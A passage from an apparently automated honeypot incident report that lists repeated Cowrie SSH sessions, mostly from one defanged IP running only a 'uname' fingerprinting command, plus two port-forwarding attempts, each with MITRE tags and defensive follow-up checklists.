| `2026-07-13 06:51:36` | `cowrie.login.success` |
| `2026-07-13 06:51:37` | `cowrie.session.params` |
| `2026-07-13 06:51:37` | `cowrie.command.input` |
| `2026-07-13 06:51:37` | `cowrie.log.closed` |
| `2026-07-13 06:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b8139f84ea9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:42` | `cowrie.session.connect` |
| `2026-07-13 06:51:42` | `cowrie.client.version` |
| `2026-07-13 06:51:42` | `cowrie.client.kex` |
| `2026-07-13 06:51:42` | `cowrie.login.success` |
| `2026-07-13 06:51:43` | `cowrie.session.params` |
| `2026-07-13 06:51:43` | `cowrie.command.input` |
| `2026-07-13 06:51:43` | `cowrie.log.closed` |
| `2026-07-13 06:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9c3f2b86a55

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:48` | `cowrie.session.connect` |
| `2026-07-13 06:51:48` | `cowrie.client.version` |
| `2026-07-13 06:51:48` | `cowrie.client.kex` |
| `2026-07-13 06:51:49` | `cowrie.login.success` |
| `2026-07-13 06:51:50` | `cowrie.session.params` |
| `2026-07-13 06:51:50` | `cowrie.command.input` |
| `2026-07-13 06:51:50` | `cowrie.log.closed` |
| `2026-07-13 06:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbc97de38554

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:54` | `cowrie.session.connect` |
| `2026-07-13 06:51:54` | `cowrie.client.version` |
| `2026-07-13 06:51:54` | `cowrie.client.kex` |
| `2026-07-13 06:51:56` | `cowrie.login.success` |
| `2026-07-13 06:51:57` | `cowrie.session.params` |
| `2026-07-13 06:51:57` | `cowrie.command.input` |
| `2026-07-13 06:51:58` | `cowrie.log.closed` |
| `2026-07-13 06:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef74f000c0c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:00` | `cowrie.session.connect` |
| `2026-07-13 06:52:01` | `cowrie.client.version` |
| `2026-07-13 06:52:01` | `cowrie.client.kex` |
| `2026-07-13 06:52:03` | `cowrie.login.success` |
| `2026-07-13 06:52:05` | `cowrie.session.params` |
| `2026-07-13 06:52:05` | `cowrie.command.input` |
| `2026-07-13 06:52:06` | `cowrie.log.closed` |
| `2026-07-13 06:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b452de289af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:07` | `cowrie.session.connect` |
| `2026-07-13 06:52:07` | `cowrie.client.version` |
| `2026-07-13 06:52:07` | `cowrie.client.kex` |
| `2026-07-13 06:52:10` | `cowrie.login.success` |
| `2026-07-13 06:52:12` | `cowrie.session.params` |
| `2026-07-13 06:52:12` | `cowrie.command.input` |
| `2026-07-13 06:52:12` | `cowrie.log.closed` |
| `2026-07-13 06:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62a6dda3dc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:14` | `cowrie.session.connect` |
| `2026-07-13 06:52:14` | `cowrie.client.version` |
| `2026-07-13 06:52:14` | `cowrie.client.kex` |
| `2026-07-13 06:52:16` | `cowrie.login.success` |
| `2026-07-13 06:52:18` | `cowrie.session.params` |
| `2026-07-13 06:52:18` | `cowrie.command.input` |
| `2026-07-13 06:52:18` | `cowrie.log.closed` |
| `2026-07-13 06:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d79e6521059

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:21` | `cowrie.session.connect` |
| `2026-07-13 06:52:22` | `cowrie.client.version` |
| `2026-07-13 06:52:22` | `cowrie.client.kex` |
| `2026-07-13 06:52:23` | `cowrie.login.success` |
| `2026-07-13 06:52:24` | `cowrie.session.params` |
| `2026-07-13 06:52:24` | `cowrie.command.input` |
| `2026-07-13 06:52:24` | `cowrie.log.closed` |
| `2026-07-13 06:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67642570a9cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:28` | `cowrie.session.connect` |
| `2026-07-13 06:52:28` | `cowrie.client.version` |
| `2026-07-13 06:52:28` | `cowrie.client.kex` |
| `2026-07-13 06:52:29` | `cowrie.login.success` |
| `2026-07-13 06:52:30` | `cowrie.session.params` |
| `2026-07-13 06:52:30` | `cowrie.command.input` |
| `2026-07-13 06:52:30` | `cowrie.log.closed` |
| `2026-07-13 06:52:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53ef03bd2af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:35` | `cowrie.session.connect` |
| `2026-07-13 06:52:35` | `cowrie.client.version` |
| `2026-07-13 06:52:35` | `cowrie.client.kex` |
| `2026-07-13 06:52:35` | `cowrie.login.success` |
| `2026-07-13 06:52:36` | `cowrie.session.params` |
| `2026-07-13 06:52:36` | `cowrie.command.input` |
| `2026-07-13 06:52:36` | `cowrie.log.closed` |
| `2026-07-13 06:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78b44c83e246

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:40` | `cowrie.session.connect` |
| `2026-07-13 06:52:41` | `cowrie.client.version` |
| `2026-07-13 06:52:41` | `cowrie.client.kex` |
| `2026-07-13 06:52:44` | `cowrie.login.success` |
| `2026-07-13 06:52:46` | `cowrie.session.params` |
| `2026-07-13 06:52:46` | `cowrie.command.input` |
| `2026-07-13 06:52:47` | `cowrie.log.closed` |
| `2026-07-13 06:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f7146e647e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:48` | `cowrie.session.connect` |
| `2026-07-13 06:52:50` | `cowrie.client.version` |
| `2026-07-13 06:52:50` | `cowrie.client.kex` |
| `2026-07-13 06:52:52` | `cowrie.login.success` |
| `2026-07-13 06:52:54` | `cowrie.session.params` |
| `2026-07-13 06:52:54` | `cowrie.command.input` |
| `2026-07-13 06:52:55` | `cowrie.log.closed` |
| `2026-07-13 06:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733d784a1834

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:52 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:52:56` | `cowrie.session.connect` |
| `2026-07-13 06:52:57` | `cowrie.client.version` |
| `2026-07-13 06:52:57` | `cowrie.client.kex` |
| `2026-07-13 06:53:03` | `cowrie.login.success` |
| `2026-07-13 06:53:05` | `cowrie.session.params` |
| `2026-07-13 06:53:05` | `cowrie.command.input` |
| `2026-07-13 06:53:06` | `cowrie.log.closed` |
| `2026-07-13 06:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-611fab30b79e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:08` | `cowrie.session.connect` |
| `2026-07-13 06:53:09` | `cowrie.client.version` |
| `2026-07-13 06:53:09` | `cowrie.client.kex` |
| `2026-07-13 06:53:11` | `cowrie.login.success` |
| `2026-07-13 06:53:14` | `cowrie.session.params` |
| `2026-07-13 06:53:14` | `cowrie.command.input` |
| `2026-07-13 06:53:15` | `cowrie.log.closed` |
| `2026-07-13 06:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11aab2aa76d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:16` | `cowrie.session.connect` |
| `2026-07-13 06:53:16` | `cowrie.client.version` |
| `2026-07-13 06:53:16` | `cowrie.client.kex` |
| `2026-07-13 06:53:19` | `cowrie.login.success` |
| `2026-07-13 06:53:21` | `cowrie.session.params` |
| `2026-07-13 06:53:21` | `cowrie.command.input` |
| `2026-07-13 06:53:22` | `cowrie.log.closed` |
| `2026-07-13 06:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524104d4c374

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:21` | `cowrie.session.connect` |
| `2026-07-13 06:53:26` | `cowrie.client.version` |
| `2026-07-13 06:53:26` | `cowrie.client.kex` |
| `2026-07-13 06:53:29` | `cowrie.login.success` |
| `2026-07-13 06:53:30` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b86a5ed55b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:23` | `cowrie.session.connect` |
| `2026-07-13 06:53:24` | `cowrie.client.version` |
| `2026-07-13 06:53:24` | `cowrie.client.kex` |
| `2026-07-13 06:53:27` | `cowrie.login.success` |
| `2026-07-13 06:53:30` | `cowrie.session.params` |
| `2026-07-13 06:53:30` | `cowrie.command.input` |
| `2026-07-13 06:53:31` | `cowrie.log.closed` |
| `2026-07-13 06:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed34b41161c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:31` | `cowrie.session.connect` |
| `2026-07-13 06:53:32` | `cowrie.client.version` |
| `2026-07-13 06:53:32` | `cowrie.client.kex` |
| `2026-07-13 06:53:36` | `cowrie.login.success` |
| `2026-07-13 06:53:37` | `cowrie.session.params` |
| `2026-07-13 06:53:37` | `cowrie.command.input` |
| `2026-07-13 06:53:38` | `cowrie.log.closed` |
| `2026-07-13 06:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4f6c31e688

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:36` | `cowrie.session.connect` |
| `2026-07-13 06:53:37` | `cowrie.client.version` |
| `2026-07-13 06:53:37` | `cowrie.client.kex` |
| `2026-07-13 06:53:39` | `cowrie.login.success` |
| `2026-07-13 06:53:40` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-717b5a466761

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:41` | `cowrie.session.connect` |
| `2026-07-13 06:53:41` | `cowrie.client.version` |
| `2026-07-13 06:53:41` | `cowrie.client.kex` |
| `2026-07-13 06:53:43` | `cowrie.login.success` |
| `2026-07-13 06:53:44` | `cowrie.session.params` |
| `2026-07-13 06:53:44` | `cowrie.command.input` |
| `2026-07-13 06:53:44` | `cowrie.log.closed` |
| `2026-07-13 06:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e90a6d048028

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:49` | `cowrie.session.connect` |
| `2026-07-13 06:53:49` | `cowrie.client.version` |
| `2026-07-13 06:53:49` | `cowrie.client.kex` |
| `2026-07-13 06:53:51` | `cowrie.login.success` |
| `2026-07-13 06:53:52` | `cowrie.session.params` |
| `2026-07-13 06:53:52` | `cowrie.command.input` |
| `2026-07-13 06:53:52` | `cowrie.log.closed` |
| `2026-07-13 06:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb8c4fc41527

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:53 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:53:58` | `cowrie.session.connect` |
| `2026-07-13 06:53:58` | `cowrie.client.version` |
| `2026-07-13 06:53:58` | `cowrie.client.kex` |
| `2026-07-13 06:53:59` | `cowrie.login.success` |
| `2026-07-13 06:54:00` | `cowrie.session.params` |
| `2026-07-13 06:54:00` | `cowrie.command.input` |
| `2026-07-13 06:54:00` | `cowrie.log.closed` |
| `2026-07-13 06:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-697fcc70de15

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:54 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:54:06` | `cowrie.session.connect` |
| `2026-07-13 06:54:06` | `cowrie.client.version` |
| `2026-07-13 06:54:06` | `cowrie.client.kex` |
| `2026-07-13 06:54:08` | `cowrie.login.success` |
| `2026-07-13 06:54:08` | `cowrie.session.params` |
| `2026-07-13 06:54:08` | `cowrie.command.input` |
| `2026-07-13 06:54:09` | `cowrie.log.closed` |
| `2026-07-13 06:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c94fd44ed2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:54 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:54:13` | `cowrie.session.connect` |
| `2026-07-13 06:54:14` | `cowrie.client.version` |
| `2026-07-13 06:54:14` | `cowrie.client.kex` |
| `2026-07-13 06:54:16` | `cowrie.login.success` |
| `2026-07-13 06:54:17` | `cowrie.session.params` |
| `2026-07-13 06:54:17` | `cowrie.command.input` |
| `2026-07-13 06:54:17` | `cowrie.log.closed` |
| `2026-07-13 06:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b7e23fdb7df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:54 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:54:22` | `cowrie.session.connect` |
| `2026-07-13 06:54:22` | `cowrie.client.version` |
| `2026-07-13 06:54:22` | `cowrie.client.kex` |
| `2026-07-13 06:54:23` | `cowrie.login.success` |
| `2026-07-13 06:54:24` | `cowrie.session.params` |
| `2026-07-13 06:54:24` | `cowrie.command.input` |
| `2026-07-13 06:54:24` | `cowrie.log.closed` |
| `2026-07-13 06:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b47aba3f8c8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:54 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:54:29` | `cowrie.session.connect` |
| `2026-07-13 06:54:30` | `cowrie.client.version` |
| `2026-07-13 06:54:30` | `cowrie.client.kex` |
| `2026-07-13 06:54:31` | `cowrie.login.success` |
| `2026-07-13 06:54:32` | `cowrie.session.params` |
| `2026-07-13 06:54:32` | `cowrie.command.input` |
| `2026-07-13 06:54:33` | `cowrie.log.closed` |
| `2026-07-13 06:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b7b7c70df2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:54 |
| **Last Seen** | 2026-07-13 06:54 |
| **Session Duration** | 5s |
